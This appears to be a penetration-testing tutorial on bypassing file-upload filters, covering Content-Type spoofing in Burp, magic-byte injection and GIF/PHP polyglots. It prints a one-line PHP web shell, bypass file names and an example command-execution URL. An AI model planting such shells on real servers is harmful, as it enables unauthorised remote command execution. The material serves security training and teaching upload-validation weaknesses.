## Overview

Extension filtering alone is not sufficient to prevent file upload attacks.

Attackers can still bypass extension checks using:

- double extensions
- alternative extensions
- allowed extensions containing executable code
- renamed scripts
- misconfigured handlers

Because of this, many modern applications validate the **actual file type**, not just the filename.

Common validation methods:

1. Content-Type header validation
2. MIME-type validation (file signature / magic bytes)

These checks attempt to confirm the uploaded file genuinely belongs to an allowed category such as:

- images
- documents
- videos
- audio

However, both methods can still be bypassed.

Think of type filters as checking the label on a package *and* shaking the box to guess what's inside — useful, but still imperfect.

---

# 1. Why Type Validation Exists

File extensions can easily be manipulated:

```
shell.php.jpg
shell.jpg.php
shell.phtml
shell.php.png
```

Even image extensions may allow exploitation:

- SVG images may allow XSS
- polyglot files may execute code
- server misconfiguration may execute alternate extensions

Therefore, applications often inspect file content rather than relying on extension alone.

---

# 2. Content-Type Header Validation

Browsers automatically send a Content-Type header when uploading files.

Example upload request:

```
Content-Type: multipart/form-data
```

File section:

```
Content-Disposition: form-data; name="uploadFile"; filename="image.jpg"
Content-Type: image/jpeg
```

Back-end code may validate allowed types:

```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

If the Content-Type does not match allowed values, upload is rejected.

Example error:

```
Only images are allowed
```

---

# 3. Why Content-Type Validation is Weak

The Content-Type header is controlled by the client.

We can intercept the request and modify it.

Example bypass:

Change:

```
Content-Type: application/x-php
```

to:

```
Content-Type: image/jpeg
```

Even if file contains PHP code, the server may accept it if validation relies only on the header.

---

# 4. Modifying Content-Type in Burp

Intercept upload request and locate file section:

```
Content-Type: application/x-php
```

Modify to:

```
Content-Type: image/jpeg
```

Keep malicious content:

```php
<?php system($_REQUEST['cmd']); ?>
```

Forward request.

If validation relies only on header, upload succeeds.

Server response:

```
File successfully uploaded
```

# 6. Important Note About Content-Type Headers

Upload requests may contain two Content-Type headers:

### request header

```
Content-Type: multipart/form-data
```

### file header

```
Content-Type: image/jpeg
```

Typically we modify the file Content-Type.

Sometimes only one header exists.

Always inspect request structure carefully.

# 7. MIME-Type Validation

MIME type detection checks file content rather than request metadata.

MIME type is determined from file structure and signature.

File signatures (magic bytes) identify file type.

Example signatures:

| File Type | Magic Bytes |
|----------|-------------|
| GIF | GIF87a or GIF89a |
| PNG | \x89PNG |
| JPG | \xFF\xD8\xFF |
| PDF | %PDF |
| ZIP | PK |

Example PHP validation:

```php
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

This checks actual file content rather than extension.

---

# 8. Identifying MIME Type Locally

Linux file command identifies MIME type.

Example:

```bash
echo "this is text" > file.jpg
file file.jpg
```

Output:

```
ASCII text
```

Even though extension is `.jpg`, MIME type is text.

---

# 9. Magic Byte Injection

We can manipulate file signature to bypass MIME validation.

Example GIF signature:

```
GIF87a
GIF89a
```

Simplified magic string:

```
GIF8
```

Modify file contents:

```php
GIF8
<?php system($_REQUEST['cmd']); ?>
```

Result:

File appears as GIF image while containing PHP code.

Check locally:

```bash
echo "GIF8" > test.jpg
file test.jpg
```

Output:

```
GIF image data
```

---

# 10. Uploading Polyglot Files

Polyglot file:

valid image signature + executable code.

Example PHP shell disguised as GIF:

```php
GIF8
<?php system($_REQUEST['cmd']); ?>
```

Upload file:

```
shell.php
```

Server detects MIME type:

```
image/gif
```

But server still executes PHP code.

Result:

command execution possible.

Example execution:

```
http://<SERVER_IP>:<PORT>/uploads/shell.php?cmd=id
```

Output may include:

```
GIF8
uid=33(www-data)
```

GIF8 appears because it is printed as plaintext.

---

# 11. Combining Bypass Techniques

Multiple validation layers may exist:

- extension validation
- Content-Type validation
- MIME-type validation

We can combine techniques:

| Extension | Content-Type | MIME | Result |
|----------|--------------|------|--------|
| allowed | allowed | allowed | upload succeeds |
| blocked | allowed | allowed | may bypass extension filter |
| allowed | allowed | spoofed | may bypass MIME filter |
| allowed | spoofed | spoofed | often succeeds |

Example combinations:

```
shell.jpg.php
shell.php.jpg
shell.phtml
shell.php (GIF header)
shell.jpg (PHP content)
```

---

# 12. Common MIME Bypass Targets

File types with simple signatures:

```
GIF
BMP
TXT
SVG
CSV
```

GIF easiest to spoof because signature is ASCII.

Signature:

```
GIF8
```

Binary signatures (PNG, JPG) harder to forge manually.

# 15. Key Takeaways

- file extension validation alone is insufficient
- Content-Type header can be modified by attacker
- MIME type validation relies on file signatures
- magic bytes can spoof file types

- polyglot files allow dual interpretation
- file content validation improves security but is not foolproof
